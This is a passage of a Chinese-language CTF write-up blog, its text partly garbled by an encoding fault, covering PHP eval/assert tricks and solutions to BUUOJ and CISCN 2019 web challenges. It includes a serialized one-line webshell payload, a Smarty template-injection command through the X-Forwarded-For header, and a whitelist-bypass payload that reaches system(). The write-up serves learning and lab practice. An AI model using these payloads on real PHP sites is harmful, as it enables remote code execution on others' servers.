class="hljs-comment">//æ˜¾ç¤ºNULL</span><br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;phpinfo();&quot;</span>);   <span class="hljs-comment">//phpinfo()è¢«æ‰§è¡Œ</span><br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;phpinfo()&quot;</span>);  <span class="hljs-comment">//phpinfo()ä¸è¢«æ‰§è¡Œ</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;whoami&quot;</span>);    <span class="hljs-comment">//whoamiå‘½ä»¤è¢«æ‰§è¡Œ</span><br>	<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;whoami&quot;</span>);      <span class="hljs-comment">//whoamiå‘½ä»¤ä¸è¢«æ‰§è¡Œ</span><br>	<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;system(whoami);&quot;</span>); <span class="hljs-comment">//æ‰§è¡ŒæˆåŠŸï¼Œæ³¨æ„å’Œä¸Šä¸€æ¡çš„åŒºåˆ«</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//æˆ‘ä»¬ä¹Ÿå¯ä»¥æŠŠsystemå’Œevalç»„åˆä½¿ç”¨</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;system(&quot;whoami&quot;);&#x27;</span>;<span class="hljs-comment">// &quot;system(&#x27;whoami&#x27;);&quot;; ä¹Ÿè¡Œï¼Œä½†æ³¨æ„åé¢çš„åˆ†å·ä¸€å®šä¸èƒ½ä¸¢æ‰</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$b</span>);<br><br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//å›æ˜¾ viper3\rdj</span><br></code></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥è¿™ä¸ª<code>echo $b($a)</code>ä¹Ÿæœ‰ç‚¹è¯´æ³•ï¼Œè¿™ä¸œè¥¿æœ‰äººå«å®ƒ<code>å˜é‡å‡½æ•°</code>ï¼Œæ¯”å¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;assert&quot;</span>;<br>    <span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;eval(&#x27;phpinfo();&#x27;)&quot;</span>;<br>    @<span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//å›æ˜¾phpinfoçš„å†…å®¹ï¼Œä½†æ˜¯ï¼š</span><br><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;eval&quot;</span>;<br>    <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    @<span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//è¿™ä¸œè¥¿æ²¡æœ‰ä»»ä½•ç»“æœ</span><br><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;assert&quot;</span>;<br>    <span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;phpinfo();&quot;</span>;<br>    @<span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br>    <span class="hljs-comment">//è¿™æ®µä»£ç ä¹Ÿèƒ½phpinfo</span><br></code></pre></td></tr></table></figure>

<p>å…ˆè¯´ä¸‹è¿™ä¸ª<code>assert</code>å‡½æ•°ï¼š</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">`assert()`å‡½æ•°æ¥å—ä¸€ä¸ªè¡¨è¾¾å¼ä½œä¸ºå‚æ•°ï¼Œå¹¶å¯¹è¯¥è¡¨è¾¾å¼è¿›è¡Œæ±‚å€¼ã€‚å¦‚æœè¡¨è¾¾å¼ä¸ºçœŸï¼Œåˆ™ç»§ç»­æ‰§è¡Œåç»­ä»£ç ï¼›å¦‚æœè¡¨è¾¾å¼ä¸ºå‡ï¼Œåˆ™è§¦å‘ä¸€ä¸ªè‡´å‘½é”™è¯¯ï¼Œç»ˆæ­¢è„šæœ¬çš„æ‰§è¡Œã€‚ä½†å®ƒä¹Ÿå¯ä»¥æ‰§è¡Œä»»æ„çš„PHPä»£ç ï¼ŒåŒ…æ‹¬æ‰§è¡Œå‘½ä»¤ã€‚è¿™æ˜¯å› ä¸º`assert()`å‡½æ•°åœ¨æ‰§è¡Œæ—¶ä¼šå°†ä¼ å…¥çš„å­—ç¬¦ä¸²ä½œä¸ºPHPä»£ç è¿›è¡Œè§£æå’Œæ‰§è¡Œã€‚<br></code></pre></td></tr></table></figure>

<p>è‡³äºä¸ºä»€ä¹ˆä¸èƒ½åªå•çº¯ç”¨ä¸€ä¸ª<code>eval</code>ï¼ŒåŸå› æ˜¯PHPä¸­ä¸èƒ½ä»¥å˜é‡å‡½æ•°çš„å½¢å¼å»è°ƒç”¨å®ƒï¼ševal å±äºPHPè¯­æ³•æ„é€ çš„ä¸€éƒ¨åˆ†ï¼Œå¹¶ä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥ä¸èƒ½é€šè¿‡ å˜é‡å‡½æ•° çš„å½¢å¼æ¥è°ƒç”¨ã€‚</p>
<p>å¯ä»¥ä¸Šä¼ ä¸€ä¸ªç®€å•çš„ä¸€å¥è¯æœ¨é©¬ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;eval($_REQUEST[3]);&#x27;</span>;<span class="hljs-comment">//REQUESTæ–¹æ³•ï¼Œä¼ å®Œäº†ç”¨GETã€POSTã€COOKIEéƒ½è¡Œ</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;assert&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloPhp</span>;<br><br><span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$d</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>å…ˆç”¨<code>scandir</code>å‡½æ•°çœ‹çœ‹æ ¹ç›®å½•åº•ä¸‹éƒ½æœ‰å•¥ä¸œè¥¿ï¼š</p>
<p><code>time.php?data=O%3A8%3A&quot;HelloPhp&quot;%3A2%3A&#123;s%3A1%3A&quot;a&quot;%3Bs%3A19%3A&quot;eval(%24_REQUEST[3])%3B&quot;%3Bs%3A1%3A&quot;b&quot;%3Bs%3A6%3A&quot;assert&quot;%3B&#125;&amp;3=var_dump(scandir(&#39;/&#39;));</code></p>
<p>æ³¨æ„è¦ç”¨åˆ†å·ç»“å°¾ï¼å¦åˆ™ä¸èƒ½è¢«æ‰§è¡Œï¼ç”¨<code>var_dump</code>çš„åŸå› æ˜¯è¿™å‡½æ•°ä¼šè¿”å›æ•°ç»„</p>
<p><img src="/img/scandir2.png" srcset="/img/loading.gif" lazyload alt="scandir2"></p>
<p>æœ‰ä¸ª<code>FIag_!S_it</code>ï¼Œ<code>system</code>è¢«ç¦äº†æ‰€ä»¥ç”¨ä¸äº†<code>cat</code>ï¼Œå°è¯•<code>file_get_contents</code>ç›´æ¥è¯»ï¼Œä½†æ˜¯å‡çš„<code>flag</code>ï¼š</p>
<p><code>echo(file_get_contents(&#39;/FIag_!S_it&#39;));</code></p>
<p>æ³¨æ„è¿™ä¸ª<strong>ä¸èƒ½</strong>å†™æˆï¼š</p>
<p><code>echo(&quot;file_get_contents(&#39;/FIag_!S_it&#39;)&quot;);</code>ï¼Œè¿™ä¸ªå‘½ä»¤ä¼šæ˜¾ç¤º<code>file_get_contents(&#39;/FIag_!S_it&#39;)</code></p>
<p><img src="/img/scandir5-16992419265331.png" srcset="/img/loading.gif" lazyload alt="scandir5"></p>
<p>ç”¨èšå‰‘è¿æ¥çœ‹çœ‹æ€ä¹ˆä¸ªäº‹ï¼š</p>
<p><code>http://1730f221-b91f-4b8b-b19d-8ce0eb0211e5.node4.buuoj.cn:81/time.php?data=O%3A8%3A%22HelloPhp%22%3A2%3A&#123;s%3A1%3A%22a%22%3Bs%3A19%3A%22eval(%24_REQUEST[3])%3B%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B&#125;</code></p>
<p><img src="/img/scandir4.png" srcset="/img/loading.gif" lazyload alt="scandir4"></p>
<p><img src="/img/scandir3.png" srcset="/img/loading.gif" lazyload alt="scandir3"></p>
<p>æ²¡æœ‰ä»»ä½•ä¸œè¥¿ï¼Œåº”è¯¥æ˜¯æ²¡æƒé™ã€‚</p>
<p>çœ‹å¸ˆå‚…ä»¬çš„<code>wp</code>éƒ½æ˜¯å»<code>phpinfo()</code>æ‰¾ï¼Œ<code>ctrl+f</code>æœç´¢å°±è¡Œã€‚</p>
<p><code>payload:time.php?data=O%3A8%3A&quot;HelloPhp&quot;%3A2%3A&#123;s%3A1%3A&quot;a&quot;%3Bs%3A19%3A&quot;eval(%24_REQUEST[3])%3B&quot;%3Bs%3A1%3A&quot;b&quot;%3Bs%3A6%3A&quot;assert&quot;%3B&#125;&amp;3=phpinfo();</code></p>
<p>å†è¡¥å……ä¸‹<code>scandir()</code>è¿™ä¸ªå‡½æ•°ï¼š</p>
<p><code>scandir()</code>å‡½æ•°ä¼šæ¥å—ä¸€ä¸ªç›®å½•è·¯å¾„ä½œä¸ºå‚æ•°ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…å«è¯¥ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•çš„åç§°ã€‚è¿”å›çš„æ•°ç»„ä¸­ï¼Œæ¯ä¸ªå…ƒç´ è¡¨ç¤ºç›®å½•ä¸­çš„ä¸€ä¸ªæ–‡ä»¶æˆ–å­ç›®å½•çš„åç§°ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;../WWW&#x27;</span>;<br><span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$dir</span>);<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span> ;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure>

<p>ç»“æœï¼š</p>
<p><img src="/img/scandir1.png" srcset="/img/loading.gif" lazyload alt="scandir1"></p>
<h2 id="CISCN2019-åä¸œå—èµ›åŒº-Web11"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web11" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web11"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web11</h2><p>è¿›å»å‘ç°æ˜¯ä¸ªå’Œ<code>IP</code>æœ‰å…³çš„é¡µé¢ï¼Œå³ä¸Šè§’æ˜¾ç¤ºäº†æˆ‘ä»¬çš„å…¬ç½‘<code>IP</code>ï¼š</p>
<p><img src="/img/web11-1.png" srcset="/img/loading.gif" lazyload alt="web11-1"></p>
<p>ä¸‹é¢ç”šè‡³æœ‰è¯·æ±‚åŒ…çš„å®Œæ•´ä¿¡æ¯ï¼š</p>
<p><img src="/img/web11-2.png" srcset="/img/loading.gif" lazyload alt="web11-2"></p>
<p>æ—¢ç„¶å®ƒè·å–äº†<code>IP</code>é‚£å¤§æ¦‚ç‡å¯ä»¥æƒ³åˆ°<code>XFF</code>ä¼ªé€ ï¼ŒæŠ“åŒ…è¯•è¯•çœ‹ï¼š</p>
<p><img src="/img/web11-3.png" srcset="/img/loading.gif" lazyload alt="web11-3"></p>
<p>ç¡®å®æ˜¯è¿™æ ·ï¼Œä½†æœ‰ä»€ä¹ˆç”¨ï¼Ÿè¿™é¢˜æ˜æ˜¾ä¸æ˜¯åˆ©ç”¨XFFçš„SQLæ³¨å…¥ï¼Œæƒ³åˆ°ä¹‹å‰åšè¿‡ä¸€é“å¥½åƒå«<code>cookie is so stable</code>çš„é¢˜ï¼Œé€šè¿‡æ¨¡æ¿æ³¨å…¥è§£é¢˜ï¼Œè¯•è¯•çœ‹ï¼š</p>
<p><code>X-Forwarded-For:&#123;7*7&#125;</code></p>
<p><img src="/img/web11-5.png" srcset="/img/loading.gif" lazyload></p>
<p>è¿˜çœŸæ˜¯ï¼Œè€è§„çŸ©å…ˆåˆ¤æ–­æ˜¯ä»€ä¹ˆç±»å‹çš„ï¼Œå†è¯•è¯•:<code>X-Forwarded-For:a&#123;*comment*&#125;b</code></p>
<p><img src="/img/wweb11-6.png" srcset="/img/loading.gif" lazyload alt="wweb11-6"></p>
<p>åº”è¯¥æ˜¯<code>Smarty</code>æ¨¡æ¿ï¼Œä¸ªäººè®¤ä¸ºè¿™ä¸ªæ¨¡æ¿æœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯å¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œåœ¨<code>XFF</code>ç›´æ¥è¾“å…¥ï¼š<code>&#123;system(&#39;ls /&#39;)&#125;</code>å»æ‰¾<code>flag</code>ï¼Œç„¶åç›´æ¥<code>cat</code>è¯»å°±è¡Œäº†ã€‚</p>
<p>å…¶å®è¿™é¢˜åº•ä¸‹æœ‰è¡Œå°å­—æç¤ºäº†ï¼š<code>Build With Smarty !</code></p>
<p><img src="/img/smarty1.png" srcset="/img/loading.gif" lazyload alt="smarty1"></p>
<h2 id="CISCN-2019-åˆèµ›-Love-Math"><a href="#CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math"></a>[CISCN 2019 åˆèµ›]Love Math</h2><p>çœ‹é¢˜ç›®å¯èƒ½è·Ÿ<code>MD5</code>æœ‰å…³ï¼Ÿ</p>
<p>ç›´æ¥ç»™äº†æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123; <span class="hljs-comment">//GETä¼ å‚ï¼Œcä¸è¢«å®šä¹‰å°±é«˜äº®æºç </span><br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//ä¾‹å­ c=20-1</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<span class="hljs-comment">//åé¢ä¸¤ä¸ªä¾é \æ¥è½¬ä¹‰</span><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿™é¢˜èŠ±äº†å¾ˆé•¿æ—¶é—´æ²¡è§£å‡ºæ¥ï¼Œå› ä¸ºä¸€ç›´åœ¨æƒ³æ€ä¹ˆå»ç»•è¿‡é»‘åå•å’Œæ­£åˆ™åŒ¹é…å»æ‰§è¡Œå‘½ä»¤ï¼Œåé¢çœ‹äº†<code>wp</code>æ‰çŸ¥é“è¦åˆ©ç”¨ç»™çš„å‡½æ•°å»åšï¼Œå‚è€ƒäº†è¿™ä½å¸ˆå‚…çš„æ–‡ç« <code>https://www.cnblogs.com/20175211lyz/p/11588219.html</code></p>
<p><code>https://www.anquanke.com/post/id/220813#h3-2</code></p>
<h4 id="æ€è·¯ä¸€"><a href="#æ€è·¯ä¸€" class="headerlink" title="æ€è·¯ä¸€"></a>æ€è·¯ä¸€</h4><p>ä¸»è¦æ˜¯<code>base_convert()</code>å‡½æ•°å’Œ<code>dechex</code>å‡½æ•°çš„ä½¿ç”¨ï¼š</p>
<p><img src="/img/baseconvert.png" srcset="/img/loading.gif" lazyload alt="baseconvert"></p>
<p>å¯ä»¥çœ‹åˆ°è¿™ä¸œè¥¿çš„èŒƒå›´æ˜¯<code>2-36</code>ï¼Œæ­£å¥½è¦†ç›–äº†<code>0-9,a-z</code>ã€‚<code>dechex</code>å‡½æ•°ç”¨äºå°†åè¿›åˆ¶æ•°è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ•°ã€‚å®ƒæ¥å—ä¸€ä¸ªåè¿›åˆ¶æ•°ä½œä¸ºå‚æ•°ï¼Œå¹¶è¿”å›ä¸€ä¸ªè¡¨ç¤ºç›¸åº”åå…­è¿›åˆ¶æ•°çš„å­—ç¬¦ä¸²ã€‚</p>
<p>å…ˆçœ‹<code>wp</code>æ€ä¹ˆå†™çš„ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>) =&gt; <span class="hljs-string">&quot;hex2bin&quot;</span><br><span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">1598506324</span>) =&gt; <span class="hljs-string">&quot;5f474554&quot;</span><br><span class="hljs-variable">$pi</span>=<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-string">&quot;5f474554&quot;</span>) =&gt; <span class="hljs-variable">$pi</span>=<span class="hljs-string">&quot;_GET&quot;</span>   <span class="hljs-comment">//hex2binå°†ä¸€ä¸²16è¿›åˆ¶æ•°è½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</span><br>(<span class="hljs-variable">$$pi</span>)&#123;pi&#125;((<span class="hljs-variable">$$pi</span>)&#123;abs&#125;) =&gt; (<span class="hljs-variable">$_GET</span>)&#123;pi&#125;(<span class="hljs-variable">$_GET</span>)&#123;abs&#125;  <span class="hljs-comment">//&#123;&#125;å¯ä»¥ä»£æ›¿[]</span><br></code></pre></td></tr></table></figure>

<p><code>payload</code>ï¼š</p>
<p><code>/index.php?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;0&#125;(($$pi)&#123;1&#125;)&amp;0=system&amp;1=&lt;command&gt;</code></p>
<p>å› ä¸ºå¸ˆå‚…å†™çš„å¾ˆè¯¦ç»†è¿˜æ˜¯å¾ˆå¥½ç†è§£çš„ï¼šå…ˆåˆ©ç”¨<code>base_convert</code>å‡½æ•°è½¬å‡ºä¸€ä¸ª<code>hex2bin</code>ï¼Œå†åˆ©ç”¨<code>dechex</code>è½¬å‡ºä¸€ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå‰å‡½åå‚ç»„åˆè½¬å‡º<code>_GET</code>.</p>
<p><code>base_convert</code>é‡åˆ°<code>36</code>è¿›åˆ¶æ—¶ä¼šè½¬æ¢æˆå°å†™å­—æ¯ï¼Œä¸¾ä¸ªæ —å­ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//ç»“æœï¼ša</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base_convert</span>(A,<span class="hljs-number">36</span>,<span class="hljs-number">10</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//ç»“æœï¼š10ï¼Œè½¬å›å»å¹¶ä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜ã€‚</span><br></code></pre></td></tr></table></figure>

